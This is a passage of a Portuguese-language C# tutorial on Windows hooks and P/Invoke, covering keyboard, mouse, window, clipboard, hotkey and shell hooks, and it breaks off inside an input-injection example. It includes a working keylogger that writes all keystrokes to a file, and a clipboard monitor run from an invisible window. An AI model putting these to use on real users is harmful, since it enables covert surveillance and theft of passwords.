# Windows Hooks, API e P/Invoke em C#

## 1. P/Invoke Básico

### 1.1 Importando Funções do Windows

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;

public class PInvokeBasico
{
    // Importar função simples
    [DllImport("user32.dll")]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    // Com charset especificado
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int MessageBoxW(IntPtr hWnd, string text, string caption, uint type);

    // Com SetLastError para obter código de erro
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);

    // Com calling convention
    [DllImport("kernel32.dll", CallingConvention = CallingConvention.Winapi)]
    public static extern void GetSystemTime(out SYSTEMTIME lpSystemTime);

    // Estrutura para marshalling
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEMTIME
    {
        public ushort wYear;
        public ushort wMonth;
        public ushort wDayOfWeek;
        public ushort wDay;
        public ushort wHour;
        public ushort wMinute;
        public ushort wSecond;
        public ushort wMilliseconds;
    }

    // Exemplo de uso
    public void Exemplos()
    {
        // MessageBox
        MessageBox(IntPtr.Zero, "Olá!", "Título", 0);

        // Obter hora do sistema
        GetSystemTime(out SYSTEMTIME st);
        Console.WriteLine($"{st.wHour}:{st.wMinute}:{st.wSecond}");

        // Verificar erro
        IntPtr handle = OpenProcess(0x1F0FFF, false, 0);
        if (handle == IntPtr.Zero)
        {
            int error = Marshal.GetLastWin32Error();
            Console.WriteLine($"Erro: {error}");
        }
    }
}
```

### 1.2 Marshalling de Tipos

```csharp
public class MarshallingExemplos
{
    // String como parâmetro de saída
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern uint GetWindowsDirectory(StringBuilder lpBuffer, uint uSize);

    // Array de bytes
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead);

    // Ponteiro para estrutura
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;
    }

    // Array de estruturas
    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(
        IntPtr hProcess,
        [Out] IntPtr[] lphModule,
        int cb,
        out int lpcbNeeded);

    // Callback (delegate)
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    // String com tamanho fixo em estrutura
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    public void Exemplos()
    {
        // Obter diretório do Windows
        var sb = new StringBuilder(260);
        GetWindowsDirectory(sb, (uint)sb.Capacity);
        Console.WriteLine($"Windows: {sb}");

        // Obter posição do cursor
        GetCursorPos(out POINT pt);
        Console.WriteLine($"Cursor: {pt.X}, {pt.Y}");

        // Enumerar janelas
        EnumWindows((hWnd, lParam) =>
        {
            Console.WriteLine($"Janela: {hWnd}");
            return true; // Continua
        }, IntPtr.Zero);
    }
}
```

## 2. Hooks de Teclado

### 2.1 Hook Global de Teclado (Low-Level)

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook : IDisposable
{
    // Constantes
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;

    // Delegate para o hook
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    // Imports
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Estrutura de dados do teclado
    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    // Eventos
    public event EventHandler<KeyEventArgs> KeyDown;
    public event EventHandler<KeyEventArgs> KeyUp;

    private IntPtr _hookId = IntPtr.Zero;
    private LowLevelKeyboardProc _proc;

    public KeyboardHook()
    {
        _proc = HookCallback;
    }

    public void Start()
    {
        _hookId = SetHook(_proc);
    }

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            int msg = wParam.ToInt32();
            KBDLLHOOKSTRUCT hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

            Keys key = (Keys)hookStruct.vkCode;
            var args = new KeyEventArgs(key);

            if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
            {
                KeyDown?.Invoke(this, args);
            }
            else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
            {
                KeyUp?.Invoke(this, args);
            }

            // Se quiser bloquear a tecla, retorne (IntPtr)1 ao invés de CallNextHookEx
            // return (IntPtr)1;
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public void Dispose()
    {
        Stop();
    }
}

// Uso
public class ExemploKeyboardHook
{
    public void Executar()
    {
        using (var hook = new KeyboardHook())
        {
            hook.KeyDown += (s, e) =>
            {
                Console.WriteLine($"Tecla pressionada: {e.KeyCode}");

                // Detectar combinações
                if (e.Control && e.KeyCode == Keys.C)
                    Console.WriteLine("Ctrl+C detectado!");

                if (e.Alt && e.KeyCode == Keys.F4)
                    Console.WriteLine("Alt+F4 detectado!");
            };

            hook.KeyUp += (s, e) =>
            {
                Console.WriteLine($"Tecla solta: {e.KeyCode}");
            };

            hook.Start();

            Console.WriteLine("Hook ativo. Pressione ESC para sair.");
            Application.Run(); // Mantém o loop de mensagens
        }
    }
}
```

### 2.2 Keylogger Básico (para fins educacionais)

```csharp
public class KeyLogger : IDisposable
{
    private KeyboardHook _hook;
    private StringBuilder _buffer = new StringBuilder();
    private string _logFile;

    public KeyLogger(string logFile)
    {
        _logFile = logFile;
        _hook = new KeyboardHook();
        _hook.KeyDown += OnKeyDown;
    }

    public void Start() => _hook.Start();
    public void Stop() => _hook.Stop();

    private void OnKeyDown(object sender, KeyEventArgs e)
    {
        string key = "";

        // Teclas especiais
        switch (e.KeyCode)
        {
            case Keys.Space: key = " "; break;
            case Keys.Enter: key = "\n"; break;
            case Keys.Tab: key = "\t"; break;
            case Keys.Back: key = "[BACKSPACE]"; break;
            case Keys.Delete: key = "[DELETE]"; break;
            case Keys.Escape: key = "[ESC]"; break;
            case Keys.LControlKey:
            case Keys.RControlKey: key = "[CTRL]"; break;
            case Keys.LShiftKey:
            case Keys.RShiftKey: key = "[SHIFT]"; break;
            case Keys.LMenu:
            case Keys.RMenu: key = "[ALT]"; break;
            case Keys.LWin:
            case Keys.RWin: key = "[WIN]"; break;
            default:
                // Converte para caractere
                if (e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
                {
                    key = e.Shift ?
                        e.KeyCode.ToString() :
                        e.KeyCode.ToString().ToLower();
                }
                else if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                {
                    key = ((int)e.KeyCode - (int)Keys.D0).ToString();
                }
                else
                {
                    key = $"[{e.KeyCode}]";
                }
                break;
        }

        _buffer.Append(key);

        // Salva a cada 100 caracteres
        if (_buffer.Length >= 100)
        {
            Flush();
        }
    }

    public void Flush()
    {
        if (_buffer.Length > 0)
        {
            File.AppendAllText(_logFile,
                $"[{DateTime.Now}] {_buffer}\n");
            _buffer.Clear();
        }
    }

    public void Dispose()
    {
        Flush();
        _hook.Dispose();
    }
}
```

### 2.3 Captura de Teclas com GetAsyncKeyState

```csharp
public class KeyStateChecker
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    // Verifica se tecla está pressionada
    public static bool IsKeyPressed(Keys key)
    {
        return (GetAsyncKeyState((int)key) & 0x8000) != 0;
    }

    // Verifica se tecla foi pressionada desde última verificação
    public static bool WasKeyPressed(Keys key)
    {
        return (GetAsyncKeyState((int)key) & 0x0001) != 0;
    }

    // Verifica estados de toggle (Caps Lock, Num Lock, etc)
    public static bool IsCapsLockOn()
    {
        return (GetKeyState((int)Keys.CapsLock) & 0x0001) != 0;
    }

    public static bool IsNumLockOn()
    {
        return (GetKeyState((int)Keys.NumLock) & 0x0001) != 0;
    }

    // Monitor de teclas
    public static void MonitorarTeclas()
    {
        Console.WriteLine("Monitorando teclas (Ctrl+C para sair)...");

        while (true)
        {
            for (int i = 0; i < 256; i++)
            {
                if (IsKeyPressed((Keys)i))
                {
                    Console.WriteLine($"Tecla: {(Keys)i}");
                }
            }
            Thread.Sleep(10);
        }
    }

    // Verificar combinação de teclas
    public static bool IsHotkeyPressed(Keys modifier, Keys key)
    {
        bool modPressed = IsKeyPressed(modifier);
        bool keyPressed = IsKeyPressed(key);
        return modPressed && keyPressed;
    }
}
```

## 3. Hooks de Mouse

### 3.1 Hook Global de Mouse (Low-Level)

```csharp
public class MouseHook : IDisposable
{
    // Constantes
    private const int WH_MOUSE_LL = 14;
    private const int WM_MOUSEMOVE = 0x0200;
    private const int WM_LBUTTONDOWN = 0x0201;
    private const int WM_LBUTTONUP = 0x0202;
    private const int WM_RBUTTONDOWN = 0x0204;
    private const int WM_RBUTTONUP = 0x0205;
    private const int WM_MBUTTONDOWN = 0x0207;
    private const int WM_MBUTTONUP = 0x0208;
    private const int WM_MOUSEWHEEL = 0x020A;

    // Delegate
    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

    // Imports
    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Estrutura de dados do mouse
    [StructLayout(LayoutKind.Sequential)]
    private struct MSLLHOOKSTRUCT
    {
        public POINT pt;
        public uint mouseData;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;
    }

    // Eventos
    public event EventHandler<MouseEventArgs> MouseMove;
    public event EventHandler<MouseEventArgs> MouseDown;
    public event EventHandler<MouseEventArgs> MouseUp;
    public event EventHandler<MouseEventArgs> MouseWheel;

    private IntPtr _hookId = IntPtr.Zero;
    private LowLevelMouseProc _proc;

    public MouseHook()
    {
        _proc = HookCallback;
    }

    public void Start()
    {
        using (Process process = Process.GetCurrentProcess())
        using (ProcessModule module = process.MainModule)
        {
            _hookId = SetWindowsHookEx(WH_MOUSE_LL, _proc,
                GetModuleHandle(module.ModuleName), 0);
        }
    }

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            MSLLHOOKSTRUCT hookStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
            int msg = wParam.ToInt32();

            MouseButtons button = MouseButtons.None;
            int delta = 0;

            switch (msg)
            {
                case WM_MOUSEMOVE:
                    MouseMove?.Invoke(this, new MouseEventArgs(
                        MouseButtons.None, 0, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_LBUTTONDOWN:
                    button = MouseButtons.Left;
                    MouseDown?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_LBUTTONUP:
                    button = MouseButtons.Left;
                    MouseUp?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_RBUTTONDOWN:
                    button = MouseButtons.Right;
                    MouseDown?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_RBUTTONUP:
                    button = MouseButtons.Right;
                    MouseUp?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_MBUTTONDOWN:
                    button = MouseButtons.Middle;
                    MouseDown?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_MBUTTONUP:
                    button = MouseButtons.Middle;
                    MouseUp?.Invoke(this, new MouseEventArgs(
                        button, 1, hookStruct.pt.X, hookStruct.pt.Y, 0));
                    break;

                case WM_MOUSEWHEEL:
                    delta = (short)(hookStruct.mouseData >> 16);
                    MouseWheel?.Invoke(this, new MouseEventArgs(
                        MouseButtons.None, 0, hookStruct.pt.X, hookStruct.pt.Y, delta));
                    break;
            }
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public void Dispose()
    {
        Stop();
    }
}

// Uso
public class ExemploMouseHook
{
    public void Executar()
    {
        using (var hook = new MouseHook())
        {
            hook.MouseMove += (s, e) =>
            {
                Console.WriteLine($"Mouse moveu: {e.X}, {e.Y}");
            };

            hook.MouseDown += (s, e) =>
            {
                Console.WriteLine($"Click: {e.Button} em {e.X}, {e.Y}");
            };

            hook.MouseWheel += (s, e) =>
            {
                Console.WriteLine($"Scroll: {e.Delta}");
            };

            hook.Start();
            Console.WriteLine("Hook de mouse ativo...");
            Application.Run();
        }
    }
}
```

## 4. Hooks de Janela

### 4.1 Hook de Mensagens de Janela

```csharp
public class WindowHook : IDisposable
{
    private const int WH_CALLWNDPROC = 4;
    private const int WH_CALLWNDPROCRET = 12;
    private const int WH_GETMESSAGE = 3;
    private const int WH_CBT = 5; // Computer Based Training

    // CBT Hook Codes
    private const int HCBT_ACTIVATE = 5;
    private const int HCBT_CREATEWND = 3;
    private const int HCBT_DESTROYWND = 4;
    private const int HCBT_MINMAX = 1;
    private const int HCBT_MOVESIZE = 0;

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    // Eventos
    public event EventHandler<IntPtr> WindowCreated;
    public event EventHandler<IntPtr> WindowDestroyed;
    public event EventHandler<IntPtr> WindowActivated;

    private IntPtr _hookId;
    private HookProc _proc;

    public WindowHook()
    {
        _proc = HookCallback;
    }

    public void Start()
    {
        // Hook local (só para esta thread)
        _hookId = SetWindowsHookEx(WH_CBT, _proc, IntPtr.Zero, GetCurrentThreadId());
    }

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            switch (nCode)
            {
                case HCBT_CREATEWND:
                    WindowCreated?.Invoke(this, wParam);
                    break;

                case HCBT_DESTROYWND:
                    WindowDestroyed?.Invoke(this, wParam);
                    break;

                case HCBT_ACTIVATE:
                    WindowActivated?.Invoke(this, wParam);
                    break;
            }
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public static string GetWindowTitle(IntPtr hWnd)
    {
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(hWnd, sb, 256);
        return sb.ToString();
    }

    public void Dispose()
    {
        Stop();
    }
}
```

### 4.2 Monitorar Janelas com WinEventHook

```csharp
public class WindowEventMonitor : IDisposable
{
    private const uint WINEVENT_OUTOFCONTEXT = 0;
    private const uint EVENT_SYSTEM_FOREGROUND = 3;
    private const uint EVENT_OBJECT_CREATE = 0x8000;
    private const uint EVENT_OBJECT_DESTROY = 0x8001;
    private const uint EVENT_OBJECT_FOCUS = 0x8005;
    private const uint EVENT_SYSTEM_MINIMIZESTART = 0x0016;
    private const uint EVENT_SYSTEM_MINIMIZEEND = 0x0017;

    private delegate void WinEventDelegate(
        IntPtr hWinEventHook, uint eventType, IntPtr hwnd,
        int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWinEventHook(
        uint eventMin, uint eventMax, IntPtr hmodWinEventProc,
        WinEventDelegate lpfnWinEventProc, uint idProcess,
        uint idThread, uint dwFlags);

    [DllImport("user32.dll")]
    private static extern bool UnhookWinEvent(IntPtr hWinEventHook);

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    // Eventos
    public event EventHandler<WindowEventArgs> ForegroundChanged;
    public event EventHandler<WindowEventArgs> WindowCreated;
    public event EventHandler<WindowEventArgs> WindowDestroyed;

    private IntPtr _hookForeground;
    private IntPtr _hookCreate;
    private IntPtr _hookDestroy;
    private WinEventDelegate _delegate;

    public WindowEventMonitor()
    {
        _delegate = WinEventCallback;
    }

    public void Start()
    {
        _hookForeground = SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
            IntPtr.Zero, _delegate, 0, 0, WINEVENT_OUTOFCONTEXT);

        _hookCreate = SetWinEventHook(
            EVENT_OBJECT_CREATE, EVENT_OBJECT_CREATE,
            IntPtr.Zero, _delegate, 0, 0, WINEVENT_OUTOFCONTEXT);

        _hookDestroy = SetWinEventHook(
            EVENT_OBJECT_DESTROY, EVENT_OBJECT_DESTROY,
            IntPtr.Zero, _delegate, 0, 0, WINEVENT_OUTOFCONTEXT);
    }

    public void Stop()
    {
        if (_hookForeground != IntPtr.Zero) UnhookWinEvent(_hookForeground);
        if (_hookCreate != IntPtr.Zero) UnhookWinEvent(_hookCreate);
        if (_hookDestroy != IntPtr.Zero) UnhookWinEvent(_hookDestroy);
    }

    private void WinEventCallback(IntPtr hWinEventHook, uint eventType,
        IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
    {
        if (hwnd == IntPtr.Zero) return;

        var args = new WindowEventArgs
        {
            Handle = hwnd,
            Title = GetWindowTitle(hwnd),
            EventType = eventType
        };

        GetWindowThreadProcessId(hwnd, out uint processId);
        args.ProcessId = processId;

        switch (eventType)
        {
            case EVENT_SYSTEM_FOREGROUND:
                ForegroundChanged?.Invoke(this, args);
                break;
            case EVENT_OBJECT_CREATE:
                WindowCreated?.Invoke(this, args);
                break;
            case EVENT_OBJECT_DESTROY:
                WindowDestroyed?.Invoke(this, args);
                break;
        }
    }

    private string GetWindowTitle(IntPtr hwnd)
    {
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(hwnd, sb, 256);
        return sb.ToString();
    }

    public void Dispose()
    {
        Stop();
    }
}

public class WindowEventArgs : EventArgs
{
    public IntPtr Handle { get; set; }
    public string Title { get; set; }
    public uint ProcessId { get; set; }
    public uint EventType { get; set; }
}

// Uso
public class ExemploWindowMonitor
{
    public void Executar()
    {
        using (var monitor = new WindowEventMonitor())
        {
            monitor.ForegroundChanged += (s, e) =>
            {
                Console.WriteLine($"Janela ativa: {e.Title} (PID: {e.ProcessId})");
            };

            monitor.WindowCreated += (s, e) =>
            {
                if (!string.IsNullOrEmpty(e.Title))
                    Console.WriteLine($"Janela criada: {e.Title}");
            };

            monitor.Start();
            Console.WriteLine("Monitorando janelas...");
            Application.Run();
        }
    }
}
```

## 5. Clipboard Hook

```csharp
public class ClipboardMonitor : IDisposable
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool AddClipboardFormatListener(IntPtr hwnd);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

    private const int WM_CLIPBOARDUPDATE = 0x031D;

    public event EventHandler<ClipboardEventArgs> ClipboardChanged;

    private ClipboardWindow _window;

    public void Start()
    {
        _window = new ClipboardWindow(this);
        AddClipboardFormatListener(_window.Handle);
    }

    public void Stop()
    {
        if (_window != null)
        {
            RemoveClipboardFormatListener(_window.Handle);
            _window.Dispose();
            _window = null;
        }
    }

    internal void OnClipboardChanged()
    {
        try
        {
            var args = new ClipboardEventArgs();

            if (Clipboard.ContainsText())
            {
                args.Text = Clipboard.GetText();
                args.Format = "Text";
            }
            else if (Clipboard.ContainsImage())
            {
                args.Image = Clipboard.GetImage();
                args.Format = "Image";
            }
            else if (Clipboard.ContainsFileDropList())
            {
                args.Files = Clipboard.GetFileDropList().Cast<string>().ToArray();
                args.Format = "Files";
            }

            ClipboardChanged?.Invoke(this, args);
        }
        catch { }
    }

    public void Dispose()
    {
        Stop();
    }

    private class ClipboardWindow : Form
    {
        private ClipboardMonitor _monitor;

        public ClipboardWindow(ClipboardMonitor monitor)
        {
            _monitor = monitor;
            // Janela invisível
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.Load += (s, e) => this.Size = new Size(0, 0);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                _monitor.OnClipboardChanged();
            }
            base.WndProc(ref m);
        }
    }
}

public class ClipboardEventArgs : EventArgs
{
    public string Format { get; set; }
    public string Text { get; set; }
    public Image Image { get; set; }
    public string[] Files { get; set; }
}
```

## 6. Hotkeys Globais

```csharp
public class GlobalHotkey : IDisposable
{
    [DllImport("user32.dll")]
    private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

    [DllImport("user32.dll")]
    private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

    // Modificadores
    public const uint MOD_NONE = 0x0000;
    public const uint MOD_ALT = 0x0001;
    public const uint MOD_CONTROL = 0x0002;
    public const uint MOD_SHIFT = 0x0004;
    public const uint MOD_WIN = 0x0008;

    private const int WM_HOTKEY = 0x0312;

    public event EventHandler<HotkeyEventArgs> HotkeyPressed;

    private HotkeyWindow _window;
    private Dictionary<int, HotkeyInfo> _hotkeys = new Dictionary<int, HotkeyInfo>();
    private int _currentId = 0;

    public GlobalHotkey()
    {
        _window = new HotkeyWindow(this);
    }

    public int Register(uint modifiers, Keys key)
    {
        int id = ++_currentId;

        if (RegisterHotKey(_window.Handle, id, modifiers, (uint)key))
        {
            _hotkeys[id] = new HotkeyInfo { Modifiers = modifiers, Key = key };
            return id;
        }

        throw new InvalidOperationException("Não foi possível registrar hotkey");
    }

    public void Unregister(int id)
    {
        if (_hotkeys.ContainsKey(id))
        {
            UnregisterHotKey(_window.Handle, id);
            _hotkeys.Remove(id);
        }
    }

    internal void OnHotkeyPressed(int id)
    {
        if (_hotkeys.TryGetValue(id, out var info))
        {
            HotkeyPressed?.Invoke(this, new HotkeyEventArgs
            {
                Id = id,
                Modifiers = info.Modifiers,
                Key = info.Key
            });
        }
    }

    public void Dispose()
    {
        foreach (var id in _hotkeys.Keys.ToArray())
            Unregister(id);
        _window.Dispose();
    }

    private class HotkeyInfo
    {
        public uint Modifiers { get; set; }
        public Keys Key { get; set; }
    }

    private class HotkeyWindow : Form
    {
        private GlobalHotkey _parent;

        public HotkeyWindow(GlobalHotkey parent)
        {
            _parent = parent;
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.Load += (s, e) => this.Size = new Size(0, 0);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_HOTKEY)
            {
                _parent.OnHotkeyPressed(m.WParam.ToInt32());
            }
            base.WndProc(ref m);
        }
    }
}

public class HotkeyEventArgs : EventArgs
{
    public int Id { get; set; }
    public uint Modifiers { get; set; }
    public Keys Key { get; set; }
}

// Uso
public class ExemploHotkey
{
    public void Executar()
    {
        using (var hotkey = new GlobalHotkey())
        {
            // Registra Ctrl+Shift+A
            int id1 = hotkey.Register(
                GlobalHotkey.MOD_CONTROL | GlobalHotkey.MOD_SHIFT,
                Keys.A);

            // Registra Win+F1
            int id2 = hotkey.Register(GlobalHotkey.MOD_WIN, Keys.F1);

            hotkey.HotkeyPressed += (s, e) =>
            {
                Console.WriteLine($"Hotkey pressionada! ID: {e.Id}, Key: {e.Key}");
            };

            Console.WriteLine("Hotkeys registradas. Pressione ESC para sair.");
            Application.Run();
        }
    }
}
```

## 7. Shell Hooks

```csharp
public class ShellHook : IDisposable
{
    private const int WH_SHELL = 10;

    // Shell Hook Codes
    private const int HSHELL_WINDOWCREATED = 1;
    private const int HSHELL_WINDOWDESTROYED = 2;
    private const int HSHELL_ACTIVATESHELLWINDOW = 3;
    private const int HSHELL_WINDOWACTIVATED = 4;
    private const int HSHELL_GETMINRECT = 5;
    private const int HSHELL_REDRAW = 6;
    private const int HSHELL_TASKMAN = 7;
    private const int HSHELL_LANGUAGE = 8;
    private const int HSHELL_SYSMENU = 9;
    private const int HSHELL_ENDTASK = 10;
    private const int HSHELL_FLASH = 0x8006;

    [DllImport("user32.dll")]
    private static extern bool RegisterShellHookWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool DeregisterShellHookWindow(IntPtr hWnd);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint RegisterWindowMessage(string lpString);

    public event EventHandler<ShellEventArgs> ShellEvent;

    private ShellWindow _window;
    private uint _shellMessage;

    public void Start()
    {
        _window = new ShellWindow(this);
        _shellMessage = RegisterWindowMessage("SHELLHOOK");
        RegisterShellHookWindow(_window.Handle);
    }

    public void Stop()
    {
        if (_window != null)
        {
            DeregisterShellHookWindow(_window.Handle);
            _window.Dispose();
        }
    }

    internal void ProcessShellMessage(int code, IntPtr hwnd)
    {
        var args = new ShellEventArgs
        {
            Code = code,
            Handle = hwnd
        };

        ShellEvent?.Invoke(this, args);
    }

    public uint ShellMessage => _shellMessage;

    public void Dispose() => Stop();

    private class ShellWindow : Form
    {
        private ShellHook _parent;

        public ShellWindow(ShellHook parent)
        {
            _parent = parent;
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == _parent.ShellMessage)
            {
                _parent.ProcessShellMessage(m.WParam.ToInt32(), m.LParam);
            }
            base.WndProc(ref m);
        }
    }
}

public class ShellEventArgs : EventArgs
{
    public int Code { get; set; }
    public IntPtr Handle { get; set; }
}
```

## 8. Input Injection (Enviar Input)

```csharp
public class InputInjector
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

    [StructLayout(LayoutKind.Sequential)]
    private struct INPUT
    {
        public uint type;
        public InputUnion U;
    }

    [StructLayout(LayoutKind.Explicit)]
    private struct InputUnion
    {
        [FieldOffset(0)] public MOUSEINPUT mi;
        [FieldOffset(0)] public KEYBDINPUT ki;
        [FieldOffset(0)] public HARDWAREINPUT hi;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MOUSEINPUT
    {
        public int dx;
        public int dy;
        public uint mouseData;
        public uint dwFlags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KEYBDINPUT
    {
        public ushort wVk;
        public ushort wScan;
        public uint dwFlags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct HARDWAREINPUT
    {
        public uint uMsg;
        public ushort wParamL;
        public ushort wParamH;
    }

    private const uint INPUT_MOUSE = 0;
    private const uint INPUT_KEYBOARD = 1;

    private const uint KEYEVENTF_KEYDOWN = 0x0000;
    private const uint KEYEVENTF_KEYUP = 0x0002;
    private const uint KEYEVENTF_UNICODE = 0x0004;
    private const uint KEYEVENTF_SCANCODE = 0x0008;

    private const uint MOUSEEVENTF_MOVE = 0x0001;
